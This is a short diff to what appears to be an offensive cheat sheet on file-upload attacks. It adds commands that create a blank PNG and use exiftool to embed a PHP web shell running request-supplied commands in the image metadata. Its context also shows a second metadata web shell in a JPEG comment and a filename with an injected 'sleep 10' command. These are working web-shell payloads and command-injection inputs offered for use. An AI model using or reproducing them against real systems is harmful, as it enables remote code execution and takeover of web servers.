@@ -890,6 +890,14 @@ test.jpg%0Asleep 10
 
 # Reverse Shell
 
+# make photo and shell
+```
+convert -size 1000x1000 xc:white white.png
+```
+```
+exiftool -DocumentName='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' white.png
+```
+
 >metadata:
 ```
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
